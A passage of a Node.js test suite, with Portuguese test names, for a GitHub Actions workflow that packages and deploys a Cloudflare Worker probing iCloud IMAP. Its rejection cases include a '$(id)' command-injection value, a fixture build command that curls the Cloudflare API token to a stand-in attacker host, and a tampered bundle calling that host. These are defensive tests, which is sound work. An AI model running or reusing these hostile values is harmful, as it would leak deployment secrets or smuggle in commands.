  g("init", "-q"); g("add", "-A"); g("-c", "commit.gpgsign=false", "commit", "-q", "-m", "x");
  return { ws, base, commit: g("rev-parse", "HEAD").stdout.trim() };
}
function rodar(passo, { cwd, env = {} }) {
  const tempDir = tmp();
  const r = spawnSync("bash", ["-e", "-o", "pipefail", "-c", script(passo)], { cwd, encoding: "utf8", env: { PATH: process.env.PATH, HOME: tempDir, RUNNER_TEMP: tempDir, GITHUB_WORKSPACE: cwd, GITHUB_STEP_SUMMARY: path.join(tempDir, "resumo.md"), GITHUB_OUTPUT: path.join(tempDir, "saida.txt"), ...env } });
  return { ...r, tempDir };
}

test("EXECUÇÃO — guarda da entrada: só a main e só 40 hexadecimais minúsculos", { skip: semFerramentas }, () => {
  const passo = PV[0];
  const ok = "0123456789abcdef0123456789abcdef01234567";
  assert.equal(rodar(passo, { cwd: tmp(), env: { GITHUB_REF: "refs/heads/main", COMMIT: ok } }).status, 0);
  for (const [nome, env] of [["outra branch", { GITHUB_REF: "refs/heads/poc/icloud-cloudflare-connectivity", COMMIT: ok }], ["ref de PR", { GITHUB_REF: "refs/pull/17/merge", COMMIT: ok }],
    ["vazio", { GITHUB_REF: "refs/heads/main", COMMIT: "" }], ["39 caracteres", { GITHUB_REF: "refs/heads/main", COMMIT: ok.slice(1) }], ["41 caracteres", { GITHUB_REF: "refs/heads/main", COMMIT: ok + "0" }],
    ["maiúsculas", { GITHUB_REF: "refs/heads/main", COMMIT: ok.toUpperCase() }], ["injeção de comando", { GITHUB_REF: "refs/heads/main", COMMIT: ok.slice(0, 30) + "$(id)abcd" }],
    ["nome de branch", { GITHUB_REF: "refs/heads/main", COMMIT: "poc/icloud-cloudflare-connectivity" }]])
    assert.notEqual(rodar(passo, { cwd: tmp(), env }).status, 0, nome);
});

test("EXECUÇÃO — montagem do pacote: aceita só a lista fixa de arquivos regulares, com a config equivalente à do workflow", { skip: semFerramentas }, () => {
  const passo = achar(PV, "Montar o pacote");
  const bom = fixture();
  const r = rodar(passo, { cwd: bom.ws, env: { COMMIT: bom.commit } });
  assert.equal(r.status, 0, r.stderr);
  const pacote = path.join(r.tempDir, "pacote");
  assert.deepEqual(fs.readdirSync(path.join(pacote, "src")).sort(), ["consumo.mjs", "imap.mjs", "index.mjs", "jwks.mjs", "jwt.mjs", "mensagem.mjs", "mime.mjs", "politica.mjs", "rotas.mjs"]);
  assert.deepEqual(JSON.parse(fs.readFileSync(path.join(pacote, "wrangler.jsonc"), "utf8")), CFG_FIXA);
  const fontes = fs.readFileSync(path.join(r.tempDir, "fontes.sha256"), "utf8");
  for (const n of ARQS_WORKER) assert.match(fontes, new RegExp("src/" + n + "\\.mjs"));
  const recusar = (nome, f, env) => { const x = rodar(passo, { cwd: f.ws, env: { COMMIT: f.commit, ...env } }); assert.notEqual(x.status, 0, nome); return x; };
  recusar("arquivo .env escondido", fixture({ extra: { ".env": "CLOUDFLARE_API_BASE_URL=https://atacante.exemplo\n" } }));
  recusar(".dev.vars", fixture({ extra: { ".dev.vars": "X=1\n" } }));
  recusar("package.json extra", fixture({ extra: { "package.json": "{}" } }));
  recusar("wrangler.toml extra", fixture({ extra: { "wrangler.toml": "name='x'" } }));
  recusar("arquivo extra em src", fixture({ extra: { "src/extra.mjs": "export {};\n" } }));
  recusar("build.command na config", fixture({ cfg: { ...CFG, build: { command: "curl https://atacante.exemplo/$CLOUDFLARE_API_TOKEN" } } }));
  recusar("vars na config", fixture({ cfg: { ...CFG, vars: { X: "1" } } }));
  recusar("KV na config", fixture({ cfg: { ...CFG, kv_namespaces: [{ binding: "K", id: "x" }] } }));
  recusar("segundo Durable Object", fixture({ cfg: { ...CFG, durable_objects: { bindings: [...CFG.durable_objects.bindings, { name: "OUTRO", class_name: "Outro" }] } } }));
  recusar("classe do Durable Object diferente", fixture({ cfg: { ...CFG, durable_objects: { bindings: [{ name: "CONSUMO", class_name: "OutraClasse" }] } } }));
  recusar("migração com armazenamento clássico (sem SQLite)", fixture({ cfg: { ...CFG, migrations: [{ tag: "v1", new_classes: ["ConsumoUnico"] }] } }));
  recusar("migração que apaga a classe", fixture({ cfg: { ...CFG, migrations: [...CFG.migrations, { tag: "v2", deleted_classes: ["ConsumoUnico"] }] } }));
  recusar("sem o Durable Object na config", fixture({ cfg: (({ durable_objects, migrations, ...resto }) => resto)(CFG) }));
  const faltando = fixture(); fs.rmSync(path.join(faltando.base, "src/imap.mjs")); spawnSync("git", ["-C", path.join(faltando.ws, "poc"), "add", "-A"]); 
  recusar("arquivo da lista fixa ausente", faltando);
  recusar("outra rota na config", fixture({ cfg: { ...CFG, routes: ["x.exemplo/*"] } }));
  const comLink = fixture();
  fs.rmSync(path.join(comLink.base, "src/index.mjs")); fs.symlinkSync("/etc/hostname", path.join(comLink.base, "src/index.mjs"));
  recusar("link simbólico no lugar de um arquivo", comLink);
  const errado = fixture();
  recusar("commit diferente do checkout", errado, { COMMIT: "f".repeat(40) });
  const semPasta = tmp();
  assert.notEqual(rodar(passo, { cwd: semPasta, env: { COMMIT: "a".repeat(40) } }).status, 0, "sem a pasta do Worker");
});

test("EXECUÇÃO — reconstituição: publica só o arquivo cujo sha256 confere; adulteração, hash errado ou vazio são recusados", { skip: semFerramentas }, () => {
  const passo = achar(PP, "Reconstituir");
  const conteudo = Buffer.from("export default { fetch() { return new Response('ok'); } };\n");
  const hash = (b) => spawnSync("sha256sum", [], { input: b, encoding: "utf8" }).stdout.split(" ")[0];
  const b64 = conteudo.toString("base64");
  const ok = rodar(passo, { cwd: tmp(), env: { PACOTE_B64: b64, SHA256_ESPERADO: hash(conteudo), COMMIT_APROVADO: "a".repeat(40) } });
  assert.equal(ok.status, 0, ok.stderr);
  const publicar = path.join(ok.tempDir, "publicar");
  assert.equal(fs.readFileSync(path.join(publicar, "index.js"), "utf8"), conteudo.toString());
  const cfg = JSON.parse(fs.readFileSync(path.join(publicar, "wrangler.publicar.jsonc"), "utf8"));
  assert.deepEqual(Object.keys(cfg).sort(), ["compatibility_date", "durable_objects", "main", "migrations", "name", "no_bundle", "observability", "workers_dev"]);
  assert.deepEqual(cfg.durable_objects, CFG_FIXA.durable_objects);
  assert.deepEqual(cfg.migrations, CFG_FIXA.migrations);
  assert.equal(cfg.no_bundle, true);
  assert.equal(cfg.main, path.join(publicar, "index.js"), "publica exatamente o arquivo conferido");
  const adulterado = Buffer.from("export default { fetch() { return fetch('https://atacante.exemplo'); } };\n");
  for (const [nome, env] of [["pacote adulterado com o hash do original", { PACOTE_B64: adulterado.toString("base64"), SHA256_ESPERADO: hash(conteudo) }],
    ["hash adulterado", { PACOTE_B64: b64, SHA256_ESPERADO: hash(adulterado) }], ["hash zerado", { PACOTE_B64: b64, SHA256_ESPERADO: "0".repeat(64) }],
    ["hash vazio", { PACOTE_B64: b64, SHA256_ESPERADO: "" }], ["pacote vazio", { PACOTE_B64: "", SHA256_ESPERADO: hash(conteudo) }],
    ["um byte a menos", { PACOTE_B64: conteudo.subarray(1).toString("base64"), SHA256_ESPERADO: hash(conteudo) }]]) {
    const x = rodar(passo, { cwd: tmp(), env: { COMMIT_APROVADO: "a".repeat(40), ...env } });
    assert.notEqual(x.status, 0, nome);
    assert.ok(!fs.existsSync(path.join(x.tempDir, "publicar", "wrangler.publicar.jsonc")), nome + ": nenhuma configuração de publicação é gerada para um pacote não conferido");
  }
});

// inspeção do pacote: o passo "Empacotar" EXECUTADO de verdade, com um wrangler de mentira que só grava o bundle que o teste escolhe
const BUNDLE_BOM = [
  'var __defProp = Object.defineProperty;',
  'import { connect } from "cloudflare:sockets";',
  'var POLITICA = Object.freeze({ issuer: "https://token.actions.githubusercontent.com", imap: { host: "imap.mail.me.com", porta: 993 } });',
  'var ConsumoUnico = class {',
  '  async fetch(request) { return new Response("{}"); }',
  '};',
  'function pedir(stub) { return stub.fetch("https://consumo.interno/consumir", { method: "POST" }); }',
  'async function login(s) { return s.write("a1 LOGIN x y"); }',
  'var VERBOS_PERMITIDOS = Object.freeze(["CAPABILITY", "LOGIN", "LIST", "LOGOUT"]);',
  'var VERBOS_P2 = Object.freeze(["CAPABILITY", "LOGIN", "LIST", "EXAMINE", "FETCH", "UID", "LOGOUT"]);',
  'var itens = "UID RFC822.SIZE BODYSTRUCTURE"; var pedido = "BODY.PEEK[1]<0.9>";',
  'export {',
  '  ConsumoUnico,',
  '  index_default as default',
  '};',
  '',
].join("\n");
function rodarEmpacotar(bundle, { extraDist } = {}) {
  const ws = tmp(), temp = tmp();
  const fake = path.join(ws, "experimentos/icloud-auth-probe-ferramenta/node_modules/wrangler/bin");
  fs.mkdirSync(fake, { recursive: true });
  fs.writeFileSync(path.join(fake, "wrangler.js"), 'const fs=require("fs"),p=require("path");const o=process.argv[process.argv.indexOf("--outdir")+1];fs.mkdirSync(o,{recursive:true});fs.writeFileSync(p.join(o,"index.js"),fs.readFileSync(process.env.BUNDLE_FALSO));' + (extraDist ? 'fs.writeFileSync(p.join(o,' + JSON.stringify(extraDist) + '),"x");' : ""));
  fs.mkdirSync(path.join(temp, "pacote"), { recursive: true });
  fs.writeFileSync(path.join(temp, "fontes.sha256"), "00  ./README.md\n");
  const arq = path.join(temp, "bundle-falso.js");
  fs.writeFileSync(arq, bundle);
  const r = spawnSync("bash", ["-e", "-o", "pipefail", "-c", script(achar(PV, "Empacotar"))], { cwd: ws, encoding: "utf8", env: { PATH: process.env.PATH, HOME: temp, RUNNER_TEMP: temp, GITHUB_WORKSPACE: ws, GITHUB_STEP_SUMMARY: path.join(temp, "resumo.md"), GITHUB_OUTPUT: path.join(temp, "saida.txt"), COMMIT: "a".repeat(40), BUNDLE_FALSO: arq } });
  return { ...r, temp };
}

test("EXECUÇÃO — inspeção do pacote: aceita o bundle esperado (sockets, host IMAP, Durable Object exportado) e recusa tudo o que sair da lista exata", { skip: semFerramentas }, () => {
  const ok = rodarEmpacotar(BUNDLE_BOM);
  assert.equal(ok.status, 0, ok.stderr);
  const saida = fs.readFileSync(path.join(ok.temp, "saida.txt"), "utf8");
  assert.match(saida, /^commit=a{40}$/m);
  assert.match(saida, /^sha256=[0-9a-f]{64}$/m);
  assert.match(fs.readFileSync(path.join(ok.temp, "resumo.md"), "utf8"), /Durable Object CONSUMO/);
  const ruins = [
    ["process.env", BUNDLE_BOM + "var a = process.env.X;\n"], ["eval", BUNDLE_BOM + "eval(x);\n"], ["new Function", BUNDLE_BOM + "new Function('x');\n"],
    ["console", BUNDLE_BOM + "console.log(1);\n"], ["import dinâmico", BUNDLE_BOM + "import('x');\n"], ["require", BUNDLE_BOM + "require('x');\n"],
    ["SMTP", BUNDLE_BOM + 'var s = "smtp.mail.me.com";\n'], ["outro host da Apple", BUNDLE_BOM + 'var s = "pop.mail.me.com";\n'],
    ["outro módulo cloudflare:", BUNDLE_BOM + 'import { env } from "cloudflare:workers";\n'], ["sem sockets", BUNDLE_BOM.replace('import { connect } from "cloudflare:sockets";\n', "")],
    ["host http estranho", BUNDLE_BOM + 'var u = "https://atacante.exemplo/x";\n'], ["host http interno trocado", BUNDLE_BOM.replace("https://consumo.interno", "https://outro.interno")],
    ["sem o objeto interno", BUNDLE_BOM.replace('"https://consumo.interno/consumir"', '"x"')],
    ["classe do Durable Object ausente", BUNDLE_BOM.replace("var ConsumoUnico = class {", "var Outra = class {")], ["classe não exportada", BUNDLE_BOM.replace("  ConsumoUnico,\n", "")],
    ...["EXPUNGE", "APPEND", "STORE", "SEARCH", "RENAME", "SUBSCRIBE", "UNSUBSCRIBE", "AUTHENTICATE", "STARTTLS", "SELECT", "UNSELECT", "COPY", "MOVE", "IDLE", "NOOP", "CLOSE", "STATUS", "ENABLE", "NAMESPACE", "FLAGS"].map((v) => ["verbo IMAP " + v, BUNDLE_BOM + 'var v = "a2 ' + v + ' 1";\n']),
    ["leitura sem PEEK", BUNDLE_BOM + 'var v = "BODY[1]";\n'], ["RFC822.TEXT", BUNDLE_BOM + 'var v = "RFC822.TEXT";\n'], ["RFC822 puro", BUNDLE_BOM + 'var v = "RFC822";\n'],
    ["lista de verbos da P1 alterada", BUNDLE_BOM.replace('["CAPABILITY", "LOGIN", "LIST", "LOGOUT"]', '["CAPABILITY", "LOGIN", "LIST", "LOGOUT", "LSUB"]')],
    ["lista de verbos da P2 alterada", BUNDLE_BOM.replace('"EXAMINE", "FETCH", "UID", "LOGOUT"]', '"EXAMINE", "FETCH", "UID", "LOGOUT", "LSUB"]')],
    ["lista de verbos da P2 ausente", BUNDLE_BOM.replace(/var VERBOS_P2 = .*\n/, "")], ["lista de verbos da P1 ausente", BUNDLE_BOM.replace(/var VERBOS_PERMITIDOS = .*\n/, "")],
  ];
  for (const [nome, bundle] of ruins) assert.notEqual(rodarEmpacotar(bundle).status, 0, nome);
  assert.notEqual(rodarEmpacotar(BUNDLE_BOM, { extraDist: "extra.txt" }).status, 0, "arquivo inesperado no pacote gerado");
  assert.equal(rodarEmpacotar(BUNDLE_BOM, { extraDist: "index.js.map" }).status, 0, "o mapa de fontes continua permitido");
});

// ---------- coerência com a política do Worker e com a documentação ----------

const temWorker = existe("experimentos/icloud-auth-probe/src/politica.mjs");
const workerNovo = temWorker && existe("experimentos/icloud-auth-probe/src/consumo.mjs");
test("o Worker (quando a versão com replay + P1 está presente) só aceita tokens da main, do workflow deste arquivo e do Environment icloud-auth-poc, com a mesma configuração", { skip: !workerNovo && "o código do Worker está na branch da POC e chega à main com a PR dela" }, async () => {
  const { POLITICA, workflowRefEsperado, audienciasPermitidas } = await import("../experimentos/icloud-auth-probe/src/politica.mjs");
  assert.deepEqual(POLITICA.refsPermitidos, ["refs/heads/main"]);
  assert.equal(workflowRefEsperado(POLITICA.refsPermitidos[0]), POLITICA.repository + "/.github/workflows/icloud-auth-probe.yml@refs/heads/main");
  assert.equal(POLITICA.arquivoWorkflow, ".github/workflows/icloud-auth-probe.yml");
  assert.deepEqual(POLITICA.eventosPermitidos, ["workflow_dispatch"]);
  assert.equal(POLITICA.environment, "icloud-auth-poc");
  assert.match(J.executar, new RegExp("^    environment: " + POLITICA.environment + "\\s*$", "m"));
  const prefixo = /AUDIENCIA_PREFIXO: (\S+)/.exec(J.executar)[1] + ":";
  assert.equal(prefixo, POLITICA.audienciaPrefixo);
  // toda operação da política tem o passo correspondente no workflow, e vice-versa
  assert.deepEqual(POLITICA.operacoes, ["validar_oidc", "validar_uso_unico", "p1_imap", "p2_imap"]);
  for (const op of POLITICA.operacoes.filter((o) => o !== "validar_oidc")) assert.ok(J.executar.includes("inputs.operacao == '" + op + "'"), "passo ausente para " + op);
  assert.deepEqual(audienciasPermitidas(), POLITICA.operacoes.map((o) => POLITICA.audienciaPrefixo + o));
  // a configuração fixa do workflow é a wrangler.jsonc do Worker (Durable Object e migração incluídos)
  const cfg = JSON.parse(ler("experimentos/icloud-auth-probe/wrangler.jsonc")); delete cfg.$schema;
  assert.deepEqual(cfg, CFG_FIXA);
  // a lista fixa do workflow é exatamente a pasta do Worker
  const lista = fs.readdirSync(new URL("experimentos/icloud-auth-probe/src/", raiz)).map((f) => f.replace(/\.mjs$/, "")).sort();
  assert.deepEqual(lista, [...ARQS_WORKER].sort());
});

test("documentação: o guia registra o desenho B, os SHAs conferidos, a limitação de replay e o procedimento manual do workflow antigo", () => {
  const guia = ler("docs/icloud-poc-deploy.md");
  for (const sha of [SHA_CHECKOUT, SHA_NODE]) assert.ok(guia.includes(sha), "SHA ausente do guia: " + sha);
  for (const trecho of [/Desenho B/, /Disable workflow/i, /replay/i, /uso único/i, /Deployment branches/i, /icloud-probe-deploy\.yml/, /só a `main`|apenas a `main`|somente a `main`/i]) assert.match(guia, trecho);
  for (const t of [WFTXT, guia]) assert.ok(!/(?:cfut_|cfat_|eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}|Bearer [A-Za-z0-9_-]{30,})/.test(t), "parece um token escrito no texto");
});
